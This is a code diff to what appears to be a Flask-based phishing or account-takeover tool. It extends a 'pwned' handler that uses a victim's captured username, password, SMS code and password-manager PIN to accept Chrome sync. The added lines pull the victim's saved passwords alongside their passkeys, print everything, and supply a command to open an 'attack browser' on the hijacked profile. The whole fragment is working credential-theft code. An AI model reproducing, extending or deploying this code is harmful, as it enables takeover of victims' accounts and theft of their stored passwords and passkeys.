@@ -79,22 +79,26 @@ def pwned():
 
     chrome_browser.agree_to_sync()
 
-    # All should be good, get the keys
+    # All should be good, get the passwords and passkeys
+    passwords = chrome_browser.get_passwords()
     passkeys = chrome_browser.get_passkeys()
 
-    print_pwned(f"******** PWNED *******")
+    print_pwned(f"******************** PWNED ********************")
     print_pwned(f"\tUsnermae: {username}\n"
                 f"\tPassword: {password}\n"
                 f"\tSMS Code: {phone}\n"
                 f"\tMngr PIN: {password_manager_pin}")
+    print_pwned("Passwords:")
+    print(*passwords, sep='\n')
     print_pwned("Passkeys:")
-    print_pwned(*passkeys, sep='\n')
+    print(*passkeys, sep='\n')
     print_pwned("\n"
-          f"\tCommand to launch attack browser: "
-                f"google-chrome --user-data-dir={chrome_browser.tmp_dir}\n")
-    print_pwned("-"*50)
+          f"\tCommand to launch attack browser for {username}: \n"
+                f"\t\tgoogle-chrome --user-data-dir={chrome_browser.tmp_dir}\n")
+    print_pwned("*"*50)
     return render_template("pwned.html", username=username, password=password, phone=phone,
                            password_manager_pin=password_manager_pin,
+                           passwords=passwords,
                            passkeys=passkeys)
 
 # main driver function
